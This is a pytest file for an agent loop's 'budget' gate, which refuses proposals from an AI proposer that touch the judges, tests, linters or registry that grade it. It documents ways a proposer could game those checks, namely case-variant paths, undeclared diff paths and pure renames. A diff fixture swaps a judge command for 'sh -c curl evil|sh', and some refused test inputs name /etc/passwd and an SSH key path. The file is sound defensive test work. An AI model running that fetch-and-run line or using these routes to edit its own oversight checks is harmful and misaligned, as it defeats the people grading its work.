"""Anatomy gate — the loop may not edit the gate set that will judge it.

Contract: docs/idea/11-agentic-loop-contract.md §5 (DECISION 5, 5a), constraint C.
Subject:  files/anatomy/bone/budget.py, wired into ledger.ProposerLedger.check()

THE REQUIREMENT: **a proposal is refused if it touches the oracle of a judge in
the gate set it declared.** Constraint C states the reason in one line — *a gate
you can satisfy by editing the gate is not one* — and in a self-improvement loop
that is not a hypothetical: relaxing `.ansible-lint` is a strictly cheaper way
to turn a set green than fixing anything, and a proposer optimising for green
verdicts will find it before it finds a real fix.

WHY THIS FILE IS BUILT AROUND A DISCRIMINATOR, NOT A LIST
---------------------------------------------------------
A budget written as a constant deny list would pass a naive version of every
test below while being wrong in the way that matters: it would forbid
`tests/anatomy/**` even for `fast` (which does not run pytest), and it would go
on forbidding it after pytest-anatomy was dropped from a set. §5.1 requires the
forbidden set to be a FUNCTION of the gate set, so the load-bearing assertions
here are the asymmetric ones:

    test_the_budget_is_a_function_of_the_set_not_a_constant
    test_every_judge_in_a_set_has_its_oracle_forbidden_by_that_set

Both go red if the oracle patterns stop being read from the judges of the set —
which is exactly the retro-verification recorded with this gate: dropping
`tests/anatomy/**` from pytest-anatomy's `oracle_paths` turns them red while a
constant-list implementation would have stayed green.

FAIL-CLOSED, INCLUDING HERE
---------------------------
The estate's measured defect (hidden_fees/08, and M2/M3 in the contract) is
absence reading as success, and a gate that iterates over an empty registry is
the same defect wearing a test's clothes. §0 below therefore asserts the
registry is populated and that EVERY judge declares an oracle, before anything
iterates over it.

WHAT IS NOT CLAIMED: that a proposal, once accepted, cannot write elsewhere.
The budget refuses at propose time; nothing here executes a patch or watches a
filesystem. §3.3's honest boundary applies — on a single-UID host the guarantee
is refusal plus replay, not containment.

CI-safe: YAML + pure path arithmetic + a tmp sqlite db. No live estate, no
subprocess, no network.
"""

from __future__ import annotations

import ast
import inspect
import sqlite3
import sys
from pathlib import Path

import pytest
import yaml

REPO = Path(__file__).resolve().parents[2]
BONE = REPO / "files/anatomy/bone"
if str(BONE) not in sys.path:
    sys.path.insert(0, str(BONE))

import budget  # noqa: E402  — the subject
import judges  # noqa: E402  — the registry the budget is computed from
import ledger  # noqa: E402  — the enforcement site

REGISTRY_YML = REPO / "state" / "judge-sets.yml"

#: The five judges of §2.7. keap-lint is deliberately absent (DECISION 2f).
EXPECTED_JUDGES = {
    "ansible-lint", "genome-codegen", "pytest-anatomy",
    "nos-smoke", "cortex-corpus-diff",
}
EXPECTED_SETS = {"fast", "repo", "live", "full"}

#: An oracle path that does not exist on disk today, listed on purpose so the
#: loop cannot CREATE it and point collection somewhere else.
KNOWN_ABSENT = {"pytest.ini"}


@pytest.fixture(scope="module")
def registry() -> judges.Registry:
    return judges.load_registry(REPO)


@pytest.fixture()
def proposer(tmp_path, monkeypatch):
    """A proposer bound to a tmp wing.db — the same fixture shape as
    test_loop_ledger.py, because the enforcement site is the ledger."""
    path = tmp_path / "wing.db"
    sqlite3.connect(str(path)).close()
    monkeypatch.setenv("WING_DB_PATH", str(path))
    monkeypatch.setenv("WING_EVENTS_HMAC_SECRET", "loop-budget-test-secret")
    led = ledger.open_ledger(
        "proposer", weakness_index={"hidden-fee:08": "sha-08"})
    yield led
    led.close()


def propose(led, **over):
    kw = dict(weakness_id="hidden-fee:08",
              target_paths=["roles/pazny.gitea/defaults/main.yml"],
              intent_class="config-fix", gate_set="repo", tree_sha="a" * 40,
              proposer_id="agent:remediator")
    kw.update(over)
    return led.record_proposal(**kw)


# ══════════════════════════════════════════════════════════════════════════
# §0 — this gate cannot pass by finding nothing
# ══════════════════════════════════════════════════════════════════════════

def test_the_registry_is_real_and_populated(registry):
    """M2/M3's defect, applied to this file: iterating an empty registry would
    make every assertion below vacuously true."""
    assert set(registry.judges) == EXPECTED_JUDGES, "the five judges of §2.7"
    assert EXPECTED_SETS <= set(registry.gate_sets)


def test_every_judge_declares_an_oracle(registry):
    """§5.1 — a judge with no declared oracle is a judge whose source the loop
    may edit while being graded by it."""
    missing = [n for n, j in registry.judges.items() if not j.oracle_paths]
    assert missing == [], f"judges with no oracle_paths: {missing}"


def test_every_declared_oracle_path_is_real(registry):
    """A deny list of typos denies nothing. Every pattern must resolve to
    something in the tree, or be a deliberate KNOWN_ABSENT."""
    for name, judge in registry.judges.items():
        for pattern in judge.oracle_paths:
            if pattern in KNOWN_ABSENT:
                continue
            if pattern.endswith("/**"):
                target = REPO / pattern[:-3]
                assert target.is_dir(), f"{name}: {pattern} is not a directory"
            else:
                assert (REPO / pattern).exists(), f"{name}: {pattern} does not exist"


def test_ADVERSARIAL_a_judge_without_an_oracle_is_a_load_error(tmp_path):
    """Fail-closed at LOAD time. If an omitted `oracle_paths` merely defaulted
    to empty, a new judge would arrive with its own source editable and nothing
    would say so."""
    raw = yaml.safe_load(REGISTRY_YML.read_text(encoding="utf-8"))
    raw["judges"]["pytest-anatomy"].pop("oracle_paths")
    (tmp_path / "state").mkdir()
    (tmp_path / "state" / "judge-sets.yml").write_text(yaml.safe_dump(raw))

    with pytest.raises(judges.ConfigError) as exc:
        judges.load_registry(tmp_path)
    assert "oracle_paths" in str(exc.value)


# ══════════════════════════════════════════════════════════════════════════
# §5.1 — THE CORE RULE: the budget is computed FROM the gate set
# ══════════════════════════════════════════════════════════════════════════

@pytest.mark.parametrize("gate_set", sorted(EXPECTED_SETS))
def test_every_judge_in_a_set_has_its_oracle_forbidden_by_that_set(registry, gate_set):
    """For each judge that will grade the proposal, every path that IS its
    oracle is forbidden — and the rule names the judge, because §5 requires the
    409 to say who claims the path."""
    bud = budget.budget_for(gate_set, registry=registry)
    claimed = {(r.pattern, r.claimed_by) for r in bud.oracle_rules()}
    for judge_name in registry.gate_set(gate_set).judges:
        for pattern in registry.judges[judge_name].oracle_paths:
            assert (pattern, judge_name) in claimed, (
                f"{gate_set}: {pattern} is {judge_name}'s oracle and is not forbidden")


def test_the_budget_is_a_function_of_the_set_not_a_constant(registry):
    """THE DISCRIMINATOR. A hardcoded deny list passes the test above and fails
    this one.

    `repo` runs pytest-anatomy, so `tests/anatomy/**` is claimed BY pytest there.
    `live` does not run it, so nothing in `live` claims it as an oracle — the
    path is still refused (deny-by-default, asserted below), but for a different
    and honest reason.
    """
    repo_bud = budget.budget_for("repo", registry=registry)
    live_bud = budget.budget_for("live", registry=registry)

    assert ("tests/anatomy/**", "pytest-anatomy") in {
        (r.pattern, r.claimed_by) for r in repo_bud.oracle_rules()}
    assert "pytest-anatomy" not in {r.claimed_by for r in live_bud.oracle_rules()}

    # …and symmetrically, the live-only judge's oracle is not claimed by `repo`.
    assert "cortex-corpus-diff" not in {r.claimed_by for r in repo_bud.oracle_rules()}
    assert ("files/anatomy/scripts/cortex-corpus-diff.py", "cortex-corpus-diff") in {
        (r.pattern, r.claimed_by) for r in live_bud.oracle_rules()}


@pytest.mark.parametrize("gate_set,path,judge", [
    ("repo", "tests/anatomy/test_loop_ledger.py", "pytest-anatomy"),
    ("repo", "tests/conftest.py", "pytest-anatomy"),
    ("repo", "pytest.ini", "pytest-anatomy"),
    ("fast", ".ansible-lint", "ansible-lint"),
    ("fast", ".yamllint", "ansible-lint"),
    ("fast", "tools/genome-codegen.py", "genome-codegen"),
    ("fast", "files/anatomy/module_utils/nos_entity.py", "genome-codegen"),
    ("fast", "state/genome/entity.schema.json", "genome-codegen"),
    ("live", "tools/nos-smoke.py", "nos-smoke"),
    ("live", "state/smoke-catalog.yml", "nos-smoke"),
    ("live", "files/anatomy/scripts/cortex-corpus-diff.py", "cortex-corpus-diff"),
])
def test_a_path_that_is_a_judges_oracle_is_refused_and_the_judge_is_named(
        registry, gate_set, path, judge):
    v = budget.check_paths([path], intent_class="config-fix", gate_set=gate_set,
                           registry=registry)
    assert len(v) == 1, f"{path} under {gate_set} was not refused"
    assert v[0].reason == "oracle"
    assert v[0].claimed_by == judge
    assert path in str(v[0]) and judge in str(v[0])


def test_ADVERSARIAL_a_proposal_that_edits_the_gate_that_judges_it_is_refused(proposer):
    """The whole gate in one act: a config-fix that quietly rewrites a test in
    the very suite that will grade it. The refusal must be a 409 that names the
    path and the judge, and the proposal must leave NO row — an accepted-then-
    ignored proposal would still consume an attempt and would still be
    judgeable, since `POST /judge` takes a proposal uuid."""
    with pytest.raises(ledger.ProposalRefused) as exc:
        propose(proposer, gate_set="repo",
                target_paths=["tests/anatomy/test_loop_ledger.py"])

    err = exc.value
    assert err.reason == "budget-violation"
    assert err.status == 409
    assert "tests/anatomy/test_loop_ledger.py" in err.detail
    assert "pytest-anatomy" in err.detail

    stored = proposer.history(ledger.fingerprint(
        "hidden-fee:08", ["tests/anatomy/test_loop_ledger.py"], "config-fix", "repo"))
    assert stored == [], "a refused proposal must not exist"


def test_the_oracle_rule_wins_even_inside_an_allowed_root(registry, monkeypatch):
    """DENY BEATS ALLOW, and this is the test that makes §5.1 load-bearing
    rather than decorative.

    Measured while retro-verifying this gate: with today's §5.3 roots, every
    oracle path ALSO happens to sit outside the allowed roots, so removing an
    oracle claim degrades the refusal reason (`oracle` → `not-in-allowed-roots`)
    without opening the path. That is a coincidence of the current root list,
    not a guarantee — adding `tests/` to ALLOWED_ROOTS is a one-line change, and
    the day it happens the oracle rule is the ONLY thing between a proposer and
    the suite grading it. So: widen the roots here, and require the refusal to
    survive.
    """
    monkeypatch.setattr(budget, "ALLOWED_ROOTS",
                        budget.ALLOWED_ROOTS + ("tests/", "state/", ".ansible-lint"))
    for path, judge in [("tests/anatomy/test_loop_ledger.py", "pytest-anatomy"),
                        ("state/genome/entity.schema.json", "genome-codegen"),
                        (".ansible-lint", "ansible-lint")]:
        v = budget.check_paths([path], intent_class="config-fix", gate_set="full",
                               registry=registry)
        assert [x.reason for x in v] == ["oracle"], f"{path} escaped via an allowed root"
        assert v[0].claimed_by == judge


def test_the_refusal_does_not_depend_on_history(proposer):
    """§5 is evaluated on shape, before the fingerprint ledger is consulted, so
    the very first attempt is refused and no attempt is spent."""
    for _ in range(3):
        with pytest.raises(ledger.ProposalRefused) as exc:
            propose(proposer, gate_set="repo", target_paths=[".ansible-lint"])
        assert exc.value.reason == "budget-violation"


# ══════════════════════════════════════════════════════════════════════════
# §5.2 — always forbidden, in EVERY set
# ══════════════════════════════════════════════════════════════════════════

@pytest.mark.parametrize("path,reason", [
    ("files/anatomy/bone/ledger.py", "engine-source"),
    ("files/anatomy/bone/budget.py", "engine-source"),
    ("roles/pazny.bone/tasks/main.yml", "engine-source"),
    ("state/judge-sets.yml", "engine-source"),
    ("docs/idea/11-agentic-loop-contract.md", "doctrine"),
    (".claude/plugins/nos-loop/skills/judge/SKILL.md", "agent-config"),
    (".github/workflows/ci.yml", "ci-config"),
    ("state/manifest.yml", "edge-surface"),
    ("roles/pazny.traefik/vars/main.yml", "edge-surface"),
    ("default.credentials.yml", "secrets"),
    ("templates/secrets.yml.j2", "secrets"),
])
@pytest.mark.parametrize("gate_set", sorted(EXPECTED_SETS))
def test_the_always_forbidden_set_holds_in_every_gate_set(registry, gate_set, path, reason):
    v = budget.check_paths([path], intent_class="config-fix", gate_set=gate_set,
                           registry=registry)
    assert [x.reason for x in v] == [reason], f"{path} under {gate_set}"


def test_the_loop_cannot_edit_the_file_that_declares_its_own_oracles(registry):
    """`state/judge-sets.yml` is where every oracle is declared, so editing it
    is editing every gate at once — the §5.1 rule with one indirection removed.
    It is forbidden by §5.2 regardless of which judges are in the set."""
    for gate_set in sorted(EXPECTED_SETS):
        v = budget.check_paths(["state/judge-sets.yml"], intent_class="gate-add",
                               gate_set=gate_set, registry=registry)
        assert v and v[0].reason == "engine-source"


def test_the_engine_cannot_rewrite_its_own_enforcement(registry):
    """Including this module. If `budget.py` were editable by a proposal graded
    by `fast`, every rule above would be one accepted patch from gone."""
    v = budget.check_paths(["files/anatomy/bone/budget.py"],
                           intent_class="config-fix", gate_set="fast",
                           registry=registry)
    assert v and v[0].reason == "engine-source"


# ══════════════════════════════════════════════════════════════════════════
# §5 — deny beats allow
# ══════════════════════════════════════════════════════════════════════════

@pytest.mark.parametrize("path", [
    "README.md", "tools/nos-push.sh", "tests/callback/test_bone_insert_event.py",
    "main.yml", "state/tofu-authentik-services.yml",
])
def test_an_unclassified_path_is_denied(registry, path):
    """DECISION 5 — same default-closed posture as
    `traefik_auth_modes.get(s.id, 'proxy')`. Not on the deny list is not the
    same as allowed."""
    v = budget.check_paths([path], intent_class="config-fix", gate_set="fast",
                           registry=registry)
    assert [x.reason for x in v] == ["not-in-allowed-roots"]


@pytest.mark.parametrize("path", [
    "roles/pazny.gitea/defaults/main.yml",
    "files/anatomy/plugins/gitea-base/plugin.yml",
    "tasks/stacks/stack-up.yml",
    "apps/documenso.yml",
    "upgrades/freescout.yml",
    "default.config.yml",
])
def test_the_allowed_roots_actually_allow(registry, path):
    """A budget that refuses everything is also useless — §5.3 must admit the
    places a real fix lives."""
    assert budget.check_paths([path], intent_class="config-fix", gate_set="full",
                              registry=registry) == []


@pytest.mark.parametrize("path", ["/etc/passwd", "~/.nos/secrets.yml", "../../.ssh/id_rsa"])
def test_paths_outside_the_repo_are_refused(registry, path):
    v = budget.check_paths([path], intent_class="config-fix", gate_set="fast",
                           registry=registry)
    assert [x.reason for x in v] == ["outside-repo"]


def test_an_unknown_gate_set_denies_rather_than_permits(proposer):
    """No computable budget must mean nothing is allowed. The opposite — an
    unknown set yielding an empty forbidden list — is M2 in the budget."""
    with pytest.raises(judges.ConfigError):
        budget.budget_for("no-such-set")
    with pytest.raises(ledger.ProposalRefused) as exc:
        propose(proposer, gate_set="no-such-set")
    assert exc.value.reason == "unknown-gate-set"


# ══════════════════════════════════════════════════════════════════════════
# §5a — the gate-add carve-out, and how narrow it is
# ══════════════════════════════════════════════════════════════════════════

def test_gate_add_may_write_a_gate(registry):
    """Forbidding `tests/anatomy/**` outright would mean the loop can never add
    a gate, which is among the most valuable things it could do."""
    assert budget.check_paths(["tests/anatomy/test_new_thing.py"],
                              intent_class="gate-add", gate_set="repo",
                              registry=registry) == []


@pytest.mark.parametrize("path", [
    "tests/anatomy/conftest.py",   # decides which gates are collected
    "tests/conftest.py",
    "pytest.ini",
    "tools/genome-codegen.py",     # another judge's oracle
    "files/anatomy/bone/ledger.py",
    "state/judge-sets.yml",
])
def test_the_carve_out_does_not_extend_to_the_harness_or_other_oracles(registry, path):
    v = budget.check_paths([path], intent_class="gate-add", gate_set="full",
                           registry=registry)
    assert v, f"gate-add must not reach {path}"


@pytest.mark.parametrize("intent", sorted(ledger.INTENT_CLASSES - {"gate-add"}))
def test_no_other_intent_gets_the_carve_out(registry, intent):
    v = budget.check_paths(["tests/anatomy/test_new_thing.py"],
                           intent_class=intent, gate_set="repo", registry=registry)
    assert v, f"{intent} must not write the oracle's directory"


def test_the_carve_out_only_exists_where_an_operator_must_review(proposer):
    """§5a — permitted, never auto-accepted. The two halves live in different
    modules, so the coupling is asserted rather than assumed: every intent the
    budget exempts is an intent the ledger stamps `requires_operator`."""
    assert budget.GATE_ADD_INTENTS <= ledger.OPERATOR_REQUIRED_INTENTS
    p = propose(proposer, intent_class="gate-add", gate_set="repo",
                target_paths=["tests/anatomy/test_new_thing.py"])
    assert p["requires_operator"] is True


# ══════════════════════════════════════════════════════════════════════════
# §5.4 — size
# ══════════════════════════════════════════════════════════════════════════

def test_more_files_than_the_cap_is_refused(registry):
    paths = [f"roles/pazny.gitea/tasks/f{i}.yml" for i in range(budget.MAX_FILES + 1)]
    v = budget.check_paths(paths, intent_class="config-fix", gate_set="fast",
                           registry=registry)
    assert [x.reason for x in v] == ["too-many-files"]


def test_a_diff_over_the_line_cap_is_refused(registry):
    # The diff's own headers name the declared path — since §5 reads the
    # artifact, a mismatched fixture would refuse for `undeclared-path` and this
    # test would stop measuring the size cap it is named for.
    target = "roles/pazny.gitea/defaults/main.yml"
    diff = f"--- a/{target}\n+++ b/{target}\n" + "".join(
        f"+line {i}\n" for i in range(budget.MAX_DIFF_LINES + 1))
    v = budget.check_paths([target], intent_class="config-fix", gate_set="fast",
                           registry=registry, diff_text=diff)
    assert [x.reason for x in v] == ["diff-too-large"]


def test_diff_headers_are_not_counted_as_edits(registry):
    diff = "--- a/x\n+++ b/x\n@@ -1 +1 @@\n-old\n+new\n"
    assert budget.diff_line_count(diff) == 2


# ══════════════════════════════════════════════════════════════════════════
# §5.2 on a case-insensitive filesystem
# ══════════════════════════════════════════════════════════════════════════
#
# MEASURED on this host (APFS, `core.ignorecase=true`): `roles/pazny.Bone/
# tasks/main.yml` and `roles/pazny.TRAEFIK/vars/main.yml` open the real,
# byte-identical protected files. Every comparison in budget.py was
# case-sensitive — `startswith`, `==`, and fnmatch, whose `posixpath.normcase`
# is a no-op even on macOS — so a single capital letter walked through the rules
# that protect the engine's own Ansible role (which renders the plist carrying
# BONE_SECRET and WING_API_TOKEN) and the file that decides which routers get
# `authentik@file` (REM-144's own control), while resolving to the real file.
#
# Deny-by-default still saved every path OUTSIDE an allowed root, which is why
# the parametrisation below is exactly the intersection that was open: a §5.2
# rule sitting INSIDE `roles/`.

CASE_VARIANTS = [
    ("roles/pazny.bone/tasks/main.yml", "roles/pazny.Bone/tasks/main.yml", "engine-source"),
    ("roles/pazny.bone/tasks/main.yml", "roles/pazny.BONE/tasks/main.yml", "engine-source"),
    ("roles/pazny.traefik/vars/main.yml", "roles/pazny.Traefik/vars/main.yml", "edge-surface"),
    ("roles/pazny.traefik/vars/main.yml", "roles/pazny.TRAEFIK/vars/main.yml", "edge-surface"),
]


@pytest.mark.parametrize("canonical,variant,reason", CASE_VARIANTS)
def test_a_capital_letter_does_not_lift_a_deny_rule(registry, canonical, variant, reason):
    """The refusal on the canonical spelling is the proof the rule was meant to
    bite; the variant must be refused for the SAME reason, not merely refused."""
    for path in (canonical, variant):
        v = budget.check_paths([path], intent_class="config-fix", gate_set="repo",
                               registry=registry)
        assert [x.reason for x in v] == [reason], f"{path} → {v}"
    # …and the variant really does resolve to the protected file on this host,
    # or the test is about a path that does not exist.
    if (REPO / canonical).is_file():
        assert (REPO / variant).read_bytes() == (REPO / canonical).read_bytes(), (
            "this filesystem is case-SENSITIVE, so the variant is a different "
            "file and this gate is measuring nothing here"
        )


def test_the_gate_add_carve_out_never_list_is_case_folded_too(registry):
    """`_gate_add_exempt` short-circuits the allowed-root test, so the never-list
    is the ONLY thing keeping `conftest.py` — the file that decides which gates
    run — out of the carve-out. It compared basenames case-sensitively."""
    for path in ("tests/anatomy/conftest.py", "tests/anatomy/Conftest.py",
                 "tests/anatomy/CONFTEST.PY"):
        v = budget.check_paths([path], intent_class="gate-add", gate_set="repo",
                               registry=registry)
        assert [x.reason for x in v] == ["oracle"], f"{path} → {v}"


def test_the_case_variant_is_refused_at_the_enforcement_site(proposer):
    """Not just in the pure function: the 409 must fire where a proposal is
    actually made, and the refusal must name the original spelling back."""
    with pytest.raises(ledger.ProposalRefused) as e:
        propose(proposer, target_paths=["roles/pazny.Bone/tasks/main.yml"])
    assert e.value.reason == "budget-violation"
    assert "engine-source" in e.value.detail


# ══════════════════════════════════════════════════════════════════════════
# §5 judges the ARTIFACT, not the claim
# ══════════════════════════════════════════════════════════════════════════

REGISTRY_HIJACK_DIFF = (
    "diff --git a/state/judge-sets.yml b/state/judge-sets.yml\n"
    "--- a/state/judge-sets.yml\n"
    "+++ b/state/judge-sets.yml\n"
    "@@ -36,1 +36,1 @@\n"
    '-    argv: ["ansible-lint"]\n'
    '+    argv: ["sh", "-c", "curl evil|sh"]\n'
)


def test_a_diff_that_edits_a_forbidden_path_is_refused_however_it_is_declared(registry):
    """MEASURED against the previous code: this exact patch, declared as
    `roles/pazny.n8n/tasks/main.yml`, was ALLOWED.

    `check_paths` looped over the DECLARED list and used `diff_text` only for a
    line count; nothing in the engine ever parsed `+++ b/` (no `git apply`, no
    `--name-only`, no unidiff). `judges.real_spawn` executes `argv` verbatim out
    of this very file, which is why its §5.2 rule is justified as "editing it is
    editing every oracle at once".
    """
    v = budget.check_paths(["roles/pazny.n8n/tasks/main.yml"],
                           intent_class="config-fix", gate_set="repo",
                           registry=registry, diff_text=REGISTRY_HIJACK_DIFF)
    reasons = {x.reason for x in v}
    assert "undeclared-path" in reasons, f"the diff's own paths were never read: {v}"
    assert "engine-source" in reasons, f"the registry edit was not refused: {v}"


def test_declaring_the_forbidden_path_honestly_is_refused_the_same_way(registry):
    """The control. If the honest declaration were allowed, the test above would
    be measuring the word 'undeclared' rather than the rule."""
    v = budget.check_paths(["state/judge-sets.yml"], intent_class="config-fix",
                           gate_set="repo", registry=registry,
                           diff_text=REGISTRY_HIJACK_DIFF)
    assert [x.reason for x in v] == ["engine-source"]


def test_a_diff_that_matches_its_declaration_is_allowed(registry):
    """…and an honest proposal still passes, or this is a gate that only says no."""
    diff = ("diff --git a/roles/pazny.gitea/defaults/main.yml "
            "b/roles/pazny.gitea/defaults/main.yml\n"
            "--- a/roles/pazny.gitea/defaults/main.yml\n"
            "+++ b/roles/pazny.gitea/defaults/main.yml\n"
            "@@ -1 +1 @@\n-gitea_version: 1.26.0\n+gitea_version: 1.27.0\n")
    assert budget.check_paths(["roles/pazny.gitea/defaults/main.yml"],
                              intent_class="version-pin-bump", gate_set="repo",
                              registry=registry, diff_text=diff) == []


def test_diff_paths_reads_both_spellings_and_ignores_dev_null():
    """A PURE rename emits no `---`/`+++` at all — only the `diff --git` line
    and the rename headers. A delete points `+++` at /dev/null.

    The fixture is the pure-rename form on purpose: an earlier version of this
    test used a rename that ALSO carried `---`/`+++`, so disabling the
    `diff --git` branch entirely left the parsed output identical and the gate
    stayed green under mutation. It was measuring the easy half.
    """
    diff = (
        "diff --git a/old/name.yml b/new/name.yml\n"
        "similarity index 100%\n"
        "rename from old/name.yml\n"
        "rename to new/name.yml\n"
        "diff --git a/gone.yml b/gone.yml\n"
        "deleted file mode 100644\n"
        "--- a/gone.yml\n+++ /dev/null\n"
    )
    assert budget.diff_paths(diff) == ["old/name.yml", "new/name.yml", "gone.yml"]


def test_a_pure_rename_out_of_a_forbidden_path_is_refused(registry):
    """The reason the branch above is load-bearing: `git mv` of an oracle emits
    no `+++` header, so a parser reading only those headers sees nothing at all
    and the move goes through."""
    diff = (
        "diff --git a/state/judge-sets.yml b/roles/pazny.gitea/judge-sets.yml\n"
        "similarity index 100%\n"
        "rename from state/judge-sets.yml\n"
        "rename to roles/pazny.gitea/judge-sets.yml\n"
    )
    v = budget.check_paths(["roles/pazny.gitea/judge-sets.yml"],
                           intent_class="config-fix", gate_set="repo",
                           registry=registry, diff_text=diff)
    assert "engine-source" in {x.reason for x in v}, v


def test_the_undeclared_path_refusal_reaches_the_proposer(proposer):
    with pytest.raises(ledger.ProposalRefused) as e:
        propose(proposer, target_paths=["roles/pazny.n8n/tasks/main.yml"],
                diff_text=REGISTRY_HIJACK_DIFF)
    assert e.value.reason == "budget-violation"
    assert "undeclared-path" in e.value.detail


# ══════════════════════════════════════════════════════════════════════════
# The budget is ENFORCED, not published
# ══════════════════════════════════════════════════════════════════════════

def test_the_propose_path_calls_the_budget(registry):
    """§5: 'Enforced by the engine, never by instruction.' A budget module that
    only answers `GET /budget` would leave the rule as advice to a model — and
    the model is the thing being constrained."""
    src = (BONE / "ledger.py").read_text(encoding="utf-8")
    tree = ast.parse(src)
    check = next(n for n in ast.walk(tree)
                 if isinstance(n, ast.FunctionDef) and n.name == "check")
    called = {
        f"{n.func.value.id}.{n.func.attr}"
        for n in ast.walk(check)
        if isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute)
        and isinstance(n.func.value, ast.Name)
    }
    assert "budget.check_paths" in called
    assert "budget.budget_for" in called
    # …and record_proposal cannot bypass it by not calling check().
    rec = next(n for n in ast.walk(tree)
               if isinstance(n, ast.FunctionDef) and n.name == "record_proposal")
    assert any(isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute)
               and n.func.attr == "check" for n in ast.walk(rec))


def test_the_budget_takes_no_caller_supplied_permission(registry):
    """Nothing in the signature lets a proposer widen its own budget — the same
    shape as constraint A's 'no field influences a verdict'."""
    params = set(inspect.signature(budget.check_paths).parameters)
    for forbidden in ("allow", "allowed_roots", "force", "override", "exempt"):
        assert forbidden not in params
    params = set(inspect.signature(ledger.ProposerLedger.record_proposal).parameters)
    for forbidden in ("allow", "budget", "override", "requires_operator"):
        assert forbidden not in params
